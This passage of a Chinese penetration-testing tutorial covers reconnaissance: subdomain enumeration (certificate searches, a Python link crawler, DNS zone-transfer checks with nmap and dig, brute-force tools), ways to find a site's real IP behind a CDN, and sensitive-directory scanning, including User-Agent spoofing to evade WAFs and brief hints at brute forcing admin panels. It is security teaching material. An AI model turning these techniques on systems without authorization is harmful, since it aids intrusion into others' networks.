<p>如搜狐：<a href="https://vpn.sohu-inc.com/" target="_blank" rel="noopener noreferrer">https://vpn.sohu-inc.com</a></p>
<h3 id="12https证书错误泄露域名" class="headerLink">
    <a href="#12https%e8%af%81%e4%b9%a6%e9%94%99%e8%af%af%e6%b3%84%e9%9c%b2%e5%9f%9f%e5%90%8d" class="header-mark"></a>1.2、HTTPS证书错误泄露域名</h3><p>有时候https证书报错会泄露域名</p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-5e919d93be3284e3dfe8646b93514ef68cf37a9f.png" title="image-20240318214545325" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-5e919d93be3284e3dfe8646b93514ef68cf37a9f.png">
        
    </a></p>
<h3 id="13在线网站证书查询" class="headerLink">
    <a href="#13%e5%9c%a8%e7%ba%bf%e7%bd%91%e7%ab%99%e8%af%81%e4%b9%a6%e6%9f%a5%e8%af%a2" class="header-mark"></a>1.3、在线网站证书查询</h3><p><a href="https://crt.sh/" target="_blank" rel="noopener noreferrer">https://crt.sh/</a></p>
<p><a href="https://censys.io/" target="_blank" rel="noopener noreferrer">https://censys.io/</a></p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-4e6667b1e50d27f18d67cbb72cd30906570fd805.png" title="image-20240318214636905" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-4e6667b1e50d27f18d67cbb72cd30906570fd805.png">
        
    </a></p>
<h2 id="2网络深度爬虫" class="headerLink">
    <a href="#2%e7%bd%91%e7%bb%9c%e6%b7%b1%e5%ba%a6%e7%88%ac%e8%99%ab" class="header-mark"></a>2、网络深度爬虫</h2><p>以<a href="https://forum.butian.net/share/www.sina.com.cn" target="_blank" rel="noopener noreferrer">www.sina.com.cn</a>为例，我们使用正则表达式抓取页面以sina.com.cn结尾的所有的URL（一级深度）。</p>
<h2 id="usrbinenv-python" class="headerLink">
    <a href="#usrbinenv-python" class="header-mark"></a>!/usr/bin/env python</h2><h2 id="codingutf-8" class="headerLink">
    <a href="#codingutf-8" class="header-mark"></a>coding=utf-8</h2><h2 id="authordavefangoutlookcommailtodavefangoutlookcom" class="headerLink">
    <a href="#authordavefangoutlookcommailtodavefangoutlookcom" class="header-mark"></a>author=<a href="mailto:dave.fang@outlook.com" rel="">dave.fang@outlook.com</a></h2><h2 id="create20160701" class="headerLink">
    <a href="#create20160701" class="header-mark"></a>create=20160701</h2><p>import re</p>
<p>import requests</p>
<p>from pprint import pprint</p>
<p>def crawl_page(url, domain):</p>
<p>print(&rsquo;[*] Crawl URL: {0}&rsquo;.format(url))</p>
<p>found_url = set()</p>
<p>req = requests.get(url, timeout=15)</p>
<p>content = req.text</p>
<p>link_list = re.findall(r&quot;(?&lt;=href=&quot;).+?(?=&quot;)|(?&lt;=href=&rsquo;).+?(?=&rsquo;)&quot;, content)</p>
<p>for url in link_list:</p>
<p>result = re.findall(&lsquo;http[s]?://(.*?).sina.com.cn&rsquo;, url)</p>
<p>if len(result) &gt; 0:</p>
<p>found_url.add(&rsquo;{0}.{1}&rsquo;.format(result[0], domain))</p>
<p>pprint(found_url)</p>
<p>if <strong>name</strong> == &lsquo;<strong>main</strong>&rsquo;:</p>
<p>page_url = &lsquo;<a href="http://www.sina.com.cn/" target="_blank" rel="noopener noreferrer">http://www.sina.com.cn/</a>&rsquo;</p>
<p>main_domain = &lsquo;sina.com.cn&rsquo;</p>
<p>crawl_page(page_url, main_domain)</p>
<p>一级深度爬出来的结果，就有146个子域名，这个小脚本权当抛砖引玉，可以再深度定制。</p>
<p>[*] Crawl URL: <a href="http://www.sina.com.cn/" target="_blank" rel="noopener noreferrer">http://www.sina.com.cn/</a></p>
<p>{&lsquo;2016.sina.com.cn&rsquo;,</p>
<p>&lsquo;ah.sina.com.cn&rsquo;,</p>
<p>&lsquo;ai.lottery.sina.com.cn&rsquo;,</p>
<p>&lsquo;aipai.sina.com.cn&rsquo;,</p>
<p>&lsquo;app.sina.com.cn&rsquo;,</p>
<p>&lsquo;astro.sina.com.cn&rsquo;,</p>
<p>&lsquo;auto.sina.com.cn&rsquo;,</p>
<p>&lsquo;career.sina.com.cn&rsquo;,</p>
<p>&hellip;</p>
<p>&lsquo;golf.sina.com.cn&rsquo;,</p>
<p>&lsquo;zx.jiaju.sina.com.cn&rsquo;}</p>
<p>[*] Found Links Num: 146</p>
<h2 id="3域传送漏洞" class="headerLink">
    <a href="#3%e5%9f%9f%e4%bc%a0%e9%80%81%e6%bc%8f%e6%b4%9e" class="header-mark"></a>3、域传送漏洞</h2><p>快速判断出某个特定区域的所有主机,获取域信息,如网络拓扑结构、服务器ip地址,为攻击者的入侵提供大量敏感信息。</p>
<h3 id="31常用dns记录" class="headerLink">
    <a href="#31%e5%b8%b8%e7%94%a8dns%e8%ae%b0%e5%bd%95" class="header-mark"></a>3.1、常用DNS记录</h3><p>主机记录(A记录): A记录是用于名称解析的重要记录,它将特定的主机名映射到对应主机的IP地址上。</p>
<p>IPv6主机记录(AAAA记录): 与A记录对应,用于将特定的主机名映射到一个主机的IPv6地址。</p>
<p>别名(CNAME记录): CNAME记录用于将某个别名指向到某个A记录上,这样就不需要再为某个新名字另外创建一条新的A记录。</p>
<p>电子邮件交换记录（MX记录): 记录一个邮件域名对应的IP地址</p>
<p>域名服务器记录 (NS记录): 记录该域名由哪台域名服务器解析</p>
<p>反向记录(PTR记录): 也即从IP地址到域名的一条记录</p>
<p>TXT记录：记录域名的相关文本信息</p>
<h3 id="32dns区域传送" class="headerLink">
    <a href="#32dns%e5%8c%ba%e5%9f%9f%e4%bc%a0%e9%80%81" class="header-mark"></a>3.2、DNS区域传送</h3><p>DNS服务器分为主服务器、备份服务器和缓存服务器。而域传送指的是一台备用服务器使用来自主服务器的数据更新自己的域（zone）数据库。这为运行中的DNS服务提供了一定的冗余度,其目的是为了防止主的域名服务器因意外故障变得不可用时影响到整个域名的解析。</p>
<h3 id="33域传送漏洞" class="headerLink">
    <a href="#33%e5%9f%9f%e4%bc%a0%e9%80%81%e6%bc%8f%e6%b4%9e" class="header-mark"></a>3.3、域传送漏洞</h3><p>DNS区域传送(DNS transfer)指后备DNS服务器从主服务器获取数据,以更新自己的zone数据库，这可以防止因主DNS服务器故障造成的业务中断,为DNS服务提供了冗余备份，但是许多DNS服务器却被错误配置成只要收到AXFR请求,就向对方进行域传送。</p>
<p>当存在这种错误配置时,攻击者就可以获取整个域的所有记录,造成整个网络架构泄露。正确的配置包括</p>
<p>allow-transfer {ipaddress;}; 通过ip限制可进行域传送的服务器</p>
<p>allow-transfer { key transfer; }; 通过key限制可进行域传送的服务器</p>
<h3 id="34检测" class="headerLink">
    <a href="#34%e6%a3%80%e6%b5%8b" class="header-mark"></a>3.4、检测</h3><p>nmap脚本扫描</p>
<p>nmap –script dns-zone-transfer –script-args dns-zone-transfer.domain=targetdomain -p 53 -Pn dns.xxx</p>
<p>dig命令</p>
<p>dig @114.114.114.114 twosmi1e.com axfr @指定DNS服务器, 后面指定域名,axfr为域传送请求</p>
<p>nslookup</p>
<p>输入nslookup命令进入交互式shell界面;</p>
<p>server 命令参数设定查询将要使用的DNS服务器;针对某个域名可先输入域名获取dns信息。</p>
<p>ls命令列出某个域中的所有域名;如果太长不适合查看可定向保存至文件夹中。</p>
<p>exit命令退出</p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-ddea2b5312329a51ed12f3c88fbdabc0c0c97f2d.png" title="image-20240318214733140" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-ddea2b5312329a51ed12f3c88fbdabc0c0c97f2d.png">
        
    </a></p>
<h2 id="4在线dns数据" class="headerLink">
    <a href="#4%e5%9c%a8%e7%ba%bfdns%e6%95%b0%e6%8d%ae" class="header-mark"></a>4、在线DNS数据</h2><p>有许多第三方服务聚合了大量的DNS数据集，并通过它们来检索给定域名的子域名。</p>
<h3 id="41virustotal" class="headerLink">
    <a href="#41virustotal" class="header-mark"></a>4.1、VirusTotal</h3><p><a href="https://www.virustotal.com/#/home/search" target="_blank" rel="noopener noreferrer">https://www.virustotal.com/#/home/search</a></p>
<h3 id="42dnsdumpster" class="headerLink">
    <a href="#42dnsdumpster" class="header-mark"></a>4.2、DNSdumpster</h3><p><a href="https://dnsdumpster.com/" target="_blank" rel="noopener noreferrer">https://dnsdumpster.com/</a></p>
<h3 id="42dnsdb" class="headerLink">
    <a href="#42dnsdb" class="header-mark"></a>4.2、dnsdb</h3><p><a href="https://www.dnsdb.io/zh-cn/" target="_blank" rel="noopener noreferrer">https://www.dnsdb.io/zh-cn/</a></p>
<h2 id="5自身泄漏" class="headerLink">
    <a href="#5%e8%87%aa%e8%ba%ab%e6%b3%84%e6%bc%8f" class="header-mark"></a>5、自身泄漏</h2><p>robots.txt</p>
<p>crossdomain.xml(跨域策略文件cdx)</p>
<p>从流量中分析提取</p>
<h2 id="6github泄露" class="headerLink">
    <a href="#6github%e6%b3%84%e9%9c%b2" class="header-mark"></a>6、Github泄露</h2><h2 id="7google-hacking" class="headerLink">
    <a href="#7google-hacking" class="header-mark"></a>7、Google Hacking</h2><p>搜索引擎查询都会做一些反制爬虫的手段，目前使用google去采集的方法是调用google的官方API，或者调用bing的API去辅助采集。</p>
<h2 id="8在线子域名查询" class="headerLink">
    <a href="#8%e5%9c%a8%e7%ba%bf%e5%ad%90%e5%9f%9f%e5%90%8d%e6%9f%a5%e8%af%a2" class="header-mark"></a>8、在线子域名查询</h2><p><a href="http://sbd.ximcx.cn/" target="_blank" rel="noopener noreferrer">http://sbd.ximcx.cn/</a></p>
<p><a href="http://tool.chinaz.com/subdomain/" target="_blank" rel="noopener noreferrer">http://tool.chinaz.com/subdomain/</a></p>
<h2 id="9子域名枚举爆破" class="headerLink">
    <a href="#9%e5%ad%90%e5%9f%9f%e5%90%8d%e6%9e%9a%e4%b8%be%e7%88%86%e7%a0%b4" class="header-mark"></a>9、子域名枚举爆破</h2><p>向DNS服务器(如8.8.8.8和8.8.4.4)请求字典里面的子域名，看返回的数据里面是否有记录，如果有则说明这是一个存在的子域名。比如说，向114.114.114.114定向请求<a href="https://forum.butian.net/share/www.qq.com" target="_blank" rel="noopener noreferrer">www.qq.com</a>的记录，返回了一条A记录指向182.254.34.74，就说明存在这个域名；相应的请求wooyun.qq.com并没有相应的记录返回，这就说明没有这个域名存在。</p>
<p>*<strong>注：一般只使用同一套主、副DNS，即8.8.8.8和8.8.4.4，DNS服务器不宜混搭，否则容易出现大量误报*</strong></p>
<p>发包可以用第三方库，比如说lijiejie的subDomainBrute使用了dnspython这个包。使用第三方包的确好，但是免不了一层封装和不能很好地理解DNS报文协议，也可能会降低一定的效率，和<strong>没有解决泛解析的好办法</strong>。</p>
<p><em><strong>泛解析这个问题的解决方法很简单，向DNS请求*记录，然后把枚举子域名回来的记录和*的记录比对，如果相同则直接排除\</strong></em>。但是实际上，如果使用第三方包，不自己造轮子的话，是无法实现这个的。因为有些域名的*记录是CNAME，而第三方包只能解析出IP却不会返回出CNAME给你。举个例子，以<a href="https://forum.butian.net/share/www.baidu.com" target="_blank" rel="noopener noreferrer">www.baidu.com</a>，大家ping一下都知道会跳转到<a href="https://forum.butian.net/share/www.a.shifen.com" target="_blank" rel="noopener noreferrer">www.a.shifen.com</a>，这就是一个CNAME记录，但是我们用第三方包只能获得最后解析出来的ip。</p>
<p>也就是说，<strong>如果一个域名他的泛解析是一个CNAME记录而且这又是一个CDN域名</strong>(恰巧这个又不少)，那么不是自己定制的dns查询函数，一般都会出现大量泛解析误报。这就有点像是灯下黑，知道了怎么做就可以了，却一直没有解决的办法。</p>
<p>如果要自己定制的话需要研究一下DNS报文协议，这里引用两张图片做简要分析</p>
<p>这是向DNS请求部分的：</p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-3a54865a6b9d86c5d9a35ba4260e231a94f5d1af.png" title="image-20240318215406584" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-3a54865a6b9d86c5d9a35ba4260e231a94f5d1af.png">
        
    </a></p>
<p>这是DNS服务器回传的报文：</p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-7b3a549629a1d72960f6589a53e358481a97e2ea.png" title="image-20240318215636520" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-7b3a549629a1d72960f6589a53e358481a97e2ea.png">
        
    </a></p>
<p>只需要按照这个协议的格式做正则提取即可获得我们想要的信息，A记录的是固定的正则，CNAME记录需要嵌套一层正则才能获取。</p>
<p>这里提供几个测试域名，都有CNAME记录作为泛解析的。</p>
<p>alitrip.com</p>
<p>taobao.com</p>
<p>tmall.com</p>
<p>52pk.com</p>
<p>focus.cn</p>
<h3 id="91oneforall" class="headerLink">
    <a href="#91oneforall" class="header-mark"></a>9.1、OneForAll</h3><p>下载地址：<a href="https://github.com/shmilylty/OneForAll" target="_blank" rel="noopener noreferrer">https://github.com/shmilylty/OneForAll</a></p>
<p>目前支持一键收集：子域、子域常用端口、子域Title、子域状态、子域服务器等</p>
<p>020_信息收集_子域名OneForAll</p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-d458cc2121cc80f9372c2aa98d85c293e99ba1c9.png" title="image-20240318220750492" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-d458cc2121cc80f9372c2aa98d85c293e99ba1c9.png">
        
    </a></p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-38fe8dfe06c49f4131b75270360e3d44f3788bfe.png" title="image-20240318220755282" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-38fe8dfe06c49f4131b75270360e3d44f3788bfe.png">
        
    </a></p>
<h3 id="92subdomainbrute" class="headerLink">
    <a href="#92subdomainbrute" class="header-mark"></a>9.2、subDomainBrute</h3><p>工具地址： <a href="https://github.com/lijiejie/subDomainsBrute" target="_blank" rel="noopener noreferrer">https://github.com/lijiejie/subDomainsBrute</a></p>
<p>高并发的DNS暴力枚举工具</p>
<p>020_信息收集_子域名subDomainsBrute</p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-944cc4b5a7746ebe86c542130929900239d49ed3.png" title="image-20240318223332308" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-944cc4b5a7746ebe86c542130929900239d49ed3.png">
        
    </a></p>
<h3 id="93layer" class="headerLink">
    <a href="#93layer" class="header-mark"></a>9.3、Layer</h3><p>Layer子域名挖掘机是一款域名查询工具，可提供网站子域名查询服务；拥有简洁的界面、简单的操作模式，支持服务接口、暴力搜索、同服挖掘三种模式，支持打开网站、复制域名、复制IP、复制CDN、导出域名、导出IP、导出域名+IP、导出域名+IP+WEB服务器以及导出存活网站！</p>
<p>通过查看WEB服务器信息，筛选版本比较低的服务器（win2003+iis6.0），查看每个子域名是否开启常见的端口（3389、3306、21端口等），利用爆破工具进行枚举，会达到事半功倍的效果。</p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-b7f69762bfd198a51b4f205c45d69ea1682a42bf.png" title="image-20240318223844214" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-b7f69762bfd198a51b4f205c45d69ea1682a42bf.png">
        
    </a></p>
<h3 id="94fuzsub" class="headerLink">
    <a href="#94fuzsub" class="header-mark"></a>9.4、FuzSub</h3><p><a href="https://github.com/DavexPro/FuzSub" target="_blank" rel="noopener noreferrer">https://github.com/DavexPro/FuzSub</a></p>
<h3 id="95fierce" class="headerLink">
    <a href="#95fierce" class="header-mark"></a>9.5、Fierce</h3><p><a href="https://github.com/davidpepper/fierce-domain-scanner" target="_blank" rel="noopener noreferrer">https://github.com/davidpepper/fierce-domain-scanner</a></p>
<h3 id="96御剑" class="headerLink">
    <a href="#96%e5%be%a1%e5%89%91" class="header-mark"></a>9.6、御剑</h3><h3 id="97wydomain" class="headerLink">
    <a href="#97wydomain" class="header-mark"></a>9.7、wydomain</h3><h3 id="98orangescan" class="headerLink">
    <a href="#98orangescan" class="header-mark"></a>9.8、orangescan</h3><h3 id="99dnsrecon" class="headerLink">
    <a href="#99dnsrecon" class="header-mark"></a>9.9、DNSRecon</h3><h3 id="910k8" class="headerLink">
    <a href="#910k8" class="header-mark"></a>9.10、K8</h3><h2 id="四ip信息收集" class="headerLink">
    <a href="#%e5%9b%9bip%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86" class="header-mark"></a>四、IP信息收集</h2><p>首先，我们要判断该域名是否存在CDN的情况，我们可以去在线CDN查询网站：<strong><a href="http://ping.chinaz.com/" target="_blank" rel="noopener noreferrer">http://ping.chinaz.com/</a></strong> 。如果查询出的ip数量大于一个的话，则说明该ip地址不是真实的服务器地址。以我的经验来看，<strong>如果是2个或者3个，并且这几个地址是同一地区的不同运营商的话，则很有可能这几个地址是服务器的出口地址，该服务器在内网中，通过不同运营商NAT映射供互联网访问，同时采用几个不同的运营商可以负载均衡和热备份。如果是多个ip地址，并且这些ip地址分布在不同地区的话，则基本上可以断定就是采用了CDN了</strong>。</p>
<h2 id="1cdn概念" class="headerLink">
    <a href="#1cdn%e6%a6%82%e5%bf%b5" class="header-mark"></a>1、CDN概念</h2><p>内容分发网络(content delivery network或content distribution network,缩写作CDN)指一种通过互联网互相连接的电脑网络系统,利用最靠近每位用户的服务器,更快、更可靠地将音乐、图片、视频、应用程序及其他文件发送给用户,来提供高性能、可扩展性及低成本的网络内容传递给用户，<strong>主要就是通过多个不同节点加快网站的访问速度。</strong></p>
<h2 id="2判断是否真实ip" class="headerLink">
    <a href="#2%e5%88%a4%e6%96%ad%e6%98%af%e5%90%a6%e7%9c%9f%e5%ae%9eip" class="header-mark"></a>2、判断是否真实IP</h2><h3 id="21nslookup" class="headerLink">
    <a href="#21nslookup" class="header-mark"></a>2.1、nslookup</h3><p><strong>命令端</strong></p>
<p>意义：用了CDN的会返回多个IP地址</p>
<p><strong>在线工具</strong></p>
<p><a href="http://tools.bugscaner.com/nslookup/" target="_blank" rel="noopener noreferrer">http://tools.bugscaner.com/nslookup/</a></p>
<p><a href="http://tool.chinaz.com/nslookup/" target="_blank" rel="noopener noreferrer">http://tool.chinaz.com/nslookup/</a></p>
<h3 id="22多地ping" class="headerLink">
    <a href="#22%e5%a4%9a%e5%9c%b0ping" class="header-mark"></a>2.2、多地ping</h3><p>看IP是否一致，在线工具：</p>
<p><a href="http://ping.chinaz.com/" target="_blank" rel="noopener noreferrer">http://ping.chinaz.com/</a>、</p>
<p><a href="http://ping.aizhan.com/" target="_blank" rel="noopener noreferrer">http://ping.aizhan.com/</a>、</p>
<h3 id="23ip反查" class="headerLink">
    <a href="#23ip%e5%8f%8d%e6%9f%a5" class="header-mark"></a>2.3、IP反查</h3><p>反查IP有多个域名,那IP多半不是真实IP</p>
<h2 id="3绕cdn找真实ip" class="headerLink">
    <a href="#3%e7%bb%95cdn%e6%89%be%e7%9c%9f%e5%ae%9eip" class="header-mark"></a>3、绕CDN找真实IP</h2><h3 id="31子域名" class="headerLink">
    <a href="#31%e5%ad%90%e5%9f%9f%e5%90%8d" class="header-mark"></a>3.1、子域名</h3><p>CDN不便宜，所以很多站都是主站做了CDN，而很多小站没做CDN，所以可以通过上面收集到的子域名查询到真实的IP地址，进而知道网站真实IP的C段了。</p>
<h3 id="32历史dns解析记录" class="headerLink">
    <a href="#32%e5%8e%86%e5%8f%b2dns%e8%a7%a3%e6%9e%90%e8%ae%b0%e5%bd%95" class="header-mark"></a>3.2、历史DNS解析记录</h3><p>查询未使用CDN前的DNS服务器解析记录，查看IP与域名绑定的历史记录，可能会存在使用CDN前的记录</p>
<p><a href="https://dnsdb.io/zh-cn/" target="_blank" rel="noopener noreferrer">https://dnsdb.io/zh-cn/</a> DNS查询</p>
<p><a href="https://x.threatbook.cn/" target="_blank" rel="noopener noreferrer">https://x.threatbook.cn/</a> 微步在线</p>
<p><a href="http://toolbar.netcraft.com/site_report?url=" target="_blank" rel="noopener noreferrer">http://toolbar.netcraft.com/site_report?url=</a> 在线域名信息查询</p>
<p><a href="http://viewdns.info/" target="_blank" rel="noopener noreferrer">http://viewdns.info/</a> DNS、IP等查询</p>
<p><a href="https://tools.ipip.net/cdn.php" target="_blank" rel="noopener noreferrer">https://tools.ipip.net/cdn.php</a> CDN查询IP</p>
<h3 id="33邮件服务器" class="headerLink">
    <a href="#33%e9%82%ae%e4%bb%b6%e6%9c%8d%e5%8a%a1%e5%99%a8" class="header-mark"></a>3.3、邮件服务器</h3><p>大部分网站会有注册,订阅,找回密码的功能会发送邮件,因为邮件系统一般都在内部，所以就可以通过邮箱获得真实的IP，邮件头信息中会有真实IP</p>
<h3 id="34信息泄漏" class="headerLink">
    <a href="#34%e4%bf%a1%e6%81%af%e6%b3%84%e6%bc%8f" class="header-mark"></a>3.4、信息泄漏</h3><p>有些网站会有phpinfo页面,一些debug模式不关等信息泄漏问题，上面会有真实IP</p>
<h3 id="35网络空间搜索引擎" class="headerLink">
    <a href="#35%e7%bd%91%e7%bb%9c%e7%a9%ba%e9%97%b4%e6%90%9c%e7%b4%a2%e5%bc%95%e6%93%8e" class="header-mark"></a>3.5、网络空间搜索引擎</h3><p>通过shadan、fofa等搜索引擎，通过对目标</p>
<p>网站的特征进行搜索，很多时候可以获取网站的真实IP</p>
<h3 id="36利用ssl证书查询" class="headerLink">
    <a href="#36%e5%88%a9%e7%94%a8ssl%e8%af%81%e4%b9%a6%e6%9f%a5%e8%af%a2" class="header-mark"></a>3.6、利用SSL证书查询</h3><p><a href="https://censys.io/certificates/" target="_blank" rel="noopener noreferrer">https://censys.io/certificates/</a></p>
<h3 id="37国外访问" class="headerLink">
    <a href="#37%e5%9b%bd%e5%a4%96%e8%ae%bf%e9%97%ae" class="header-mark"></a>3.7、国外访问</h3><p>一般的站点在国内可能会有CDN，但是在国外的用户覆盖率比较低，所以通过国外的节点进行请求往往能获取真实IP</p>
<h3 id="38ltm解码法" class="headerLink">
    <a href="#38ltm%e8%a7%a3%e7%a0%81%e6%b3%95" class="header-mark"></a>3.8、LTM解码法</h3><p>当服务器使用F5 LTM做负载均衡时,通过对set-cookie关键字的解码真实ip也可被获取,例如：Set-Cookie:</p>
<p>BIGipServerpool_8.29_8030=487098378.24095.0000,先把第一小节的十进制数即487098378取出来,然后将其转为十六进制数1d08880a,接着从后至前,以此取四位数出来,也就是0a.88.08.1d,最后依次把他们转为十进制数10.136.8.29,也就是最后的真实ip。</p>
<h2 id="五基本目录敏感目录及文件" class="headerLink">
    <a href="#%e4%ba%94%e5%9f%ba%e6%9c%ac%e7%9b%ae%e5%bd%95%e6%95%8f%e6%84%9f%e7%9b%ae%e5%bd%95%e5%8f%8a%e6%96%87%e4%bb%b6" class="header-mark"></a>五、基本目录、敏感目录及文件</h2><p>由于发布网站时，服务器配置问题，导致目录浏览功能打开，从而引起信息泄露，造成安全隐患。在信息收集过程中，需要收集的敏感目录/文件信息包括：</p>
<p>1.robots.txt</p>
<p>2.crossdomin.xml</p>
<p>3.sitemap.xml</p>
<p>4.后台目录</p>
<p>5.网站安装包</p>
<p>6.网站上传目录</p>
<p>7.mysql管理页面</p>
<p>8.phpinfo</p>
<p>9.网站文本编辑器</p>
<p>10.测试文件</p>
<p>11.网站备份文件(.rar、zip、.7z、.tar.gz、.bak)</p>
<p>12.DS_Store 文件</p>
<p>13.vim编辑器备份文件(.swp)</p>
<p>14.WEB—INF/web.xml文件</p>
<p>目录扫描对应信息收集来说特为重要，比如robots文件当中就可能泄露网站的后台或者CMS信息等，安装包中便泄露了网站的源码，phpinfo泄露了服务器的一些配置信息，编辑器、上传页面便可以进行利用相关的漏洞进行渗透，mysql、后台管理页面可以进行枚举爆破来尝试登陆进行下一步的安全测试。</p>
<p>扫描网站目录结构，看看是否可以遍历目录，或者敏感文件泄漏</p>
<p>后台目录：弱口令，万能密码，爆破</p>
<p>安装包：获取数据库信息，甚至是网站源码</p>
<p>上传目录：截断、上传图片马等</p>
<p>mysql管理接口：弱口令、爆破，万能密码，然后脱裤，甚至是拿到shell</p>
<p>安装页面 ：可以二次安装进而绕过</p>
<p>phpinfo：会把你配置的各种信息暴露出来</p>
<p>编辑器：fck、ke、等</p>
<p>iis短文件利用：条件比较苛刻 windows、apache等</p>
<p>robots.txt 文件是专门针对搜索引擎机器人robot 编写的一个纯文本文件。我们可以在这个文件中指定网站中不想被robot访问的目录。这样，我们网站的部分或全部内容就可以不被搜索引擎收录了，或者让搜索引擎只收录指定的内容。因此我们可</p>
<p>以利用robots.txt让Google的机器人访问不了我们网站上的重要文件，GoogleHack的威胁也就不存在了。</p>
<p>假如编写的robots.txt文件内容如下：</p>
<p>User-agent: *</p>
<p>Disallow: /data/</p>
<p>Disallow: /db/</p>
<p>Disallow: /admin/</p>
<p>Disallow: /manager/</p>
<p>Allow:/images/</p>
<p>其中“Disallow”参数后面的是禁止robot收录部分的路径，例如我们要让robot禁止收录网站目录下的“data”文件夹，只需要在Disallow参数后面加上 /data/ 即可。如果想增加其他目录，只需按此格式继续添加。文件编写完成后将其上传到网站的根目录，就可以让网站远离Google Hack了。</p>
<p>虽然robots文件目的是让搜索蜘蛛不爬取想要保护的页面，但是如果我们知道了robots文件的内容的话，我们就可以知道目标网站哪些文件夹不让访问，从侧面说明这些文件夹是很重要的了。</p>
<h2 id="1dirsearch" class="headerLink">
    <a href="#1dirsearch" class="header-mark"></a>1、dirsearch</h2><p>工具地址：<a href="https://github.com/maurosoria/dirsearch" target="_blank" rel="noopener noreferrer">https://github.com/maurosoria/dirsearch</a></p>
<p>002_目录信息_dirsearch</p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-cd2731804d040fd44ab39c011b263b8128b2a908.png" title="image-20240318223946570" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-cd2731804d040fd44ab39c011b263b8128b2a908.png">
        
    </a></p>
<h2 id="2dirbuster" class="headerLink">
    <a href="#2dirbuster" class="header-mark"></a>2、dirbuster</h2><p>工具地址：<a href="https://downloads.sourceforge.net/project/dirbuster/DirBuster%20%28jar%20%2B%20lists%29/1.0-RC1/DirBuster-1.0-RC1.zip?r=https%3A%2F%2Fsourceforge.net%2Fprojects%2Fdirbuster%2Ffiles%2FDirBuster%20%28jar%20%2B%20lists%29%2F1.0-RC1%2F&amp;ts=1491212671&amp;use_mirror=jaist" target="_blank" rel="noopener noreferrer">https://downloads.sourceforge.net/project/dirbuster/DirBuster%20%28jar%20%2B%20lists%29/1.0-RC1/DirBuster-1.0-RC1.zip?r=https%3A%2F%2Fsourceforge.net%2Fprojects%2Fdirbuster%2Ffiles%2FDirBuster%2520%2528jar%2520%252B%2520lists%2529%2F1.0-RC1%2F&amp;ts=1491212671&amp;use_mirror=jaist</a></p>
<p>当使用扫描工具对站点进行扫描，网站存在WAF后，会给我们的工具进行拦截，这时候我们需要修改User Agent值来绕过WAF的拦截，而DirBuster这款扫描工具便可以修改User Agent值</p>
<p>Mozilla/5.0 (compatible; Baiduspider/2.0; <a href="http://www.baidu.com/search/spider.html" target="_blank" rel="noopener noreferrer">http://www.baidu.com/search/spider.html</a>) 百度蜘蛛抓取欺骗</p>
<p>Mozilla/5.0 (compatible; Googlebot/2.1; <a href="http://www.google.com/bot.html" target="_blank" rel="noopener noreferrer">http://www.google.com/bot.html</a>) 谷歌蜘蛛抓取欺骗</p>
<p>Firefox 3.6 Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.2.8;baidu Transcoder) Gecko/20100722 Firefox/3.6.8 ( .NET CLR 3.5.30729) 百度转码浏览欺骗</p>
<p>Chrome Mozilla/5.0 (en-us) AppleWebKit/534.14 (KHTML, like Gecko; Google Wireless Transcoder) Chrome/9.0.597 Safari/534.14 谷歌转码浏览欺骗</p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-dff5d1680324323642d895b1451522b43dd28b1c.png" title="image-20240318224002259" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-dff5d1680324323642d895b1451522b43dd28b1c.png">
        
    </a></p>
<h2 id="37kbscan" class="headerLink">
    <a href="#37kbscan" class="header-mark"></a>3、7kbscan</h2><p>工具：<a href="https://github.com/7kbstorm/7kbscan-WebPathBrute" target="_blank" rel="noopener noreferrer">https://github.com/7kbstorm/7kbscan-WebPathBrute</a></p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-9a03d3e6d87ddc4be1a249d43fdc24c1071e38b8.png" title="image-20240318224015520" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-9a03d3e6d87ddc4be1a249d43fdc24c1071e38b8.png">
        
    </a></p>
<h2 id="4webrobot" class="headerLink">
    <a href="#4webrobot" class="header-mark"></a>4、Webrobot</h2><h2 id="5御剑" class="headerLink">
    <a href="#5%e5%be%a1%e5%89%91" class="header-mark"></a>5、御剑</h2><h2 id="6爬虫-中国菜刀" class="headerLink">
    <a href="#6%e7%88%ac%e8%99%ab-%e4%b8%ad%e5%9b%bd%e8%8f%9c%e5%88%80" class="header-mark"></a>6、爬虫-中国菜刀</h2><h2 id="7wwwscan" class="headerLink">
    <a href="#7wwwscan" class="header-mark"></a>7、wwwscan</h2><h2 id="8cansina" class="headerLink">
    <a href="#8cansina" class="header-mark"></a>8、cansina</h2><h2 id="9dirmap" class="headerLink">
    <a href="#9dirmap" class="header-mark"></a>9、dirmap</h2><h2 id="10webdirscan" class="headerLink">
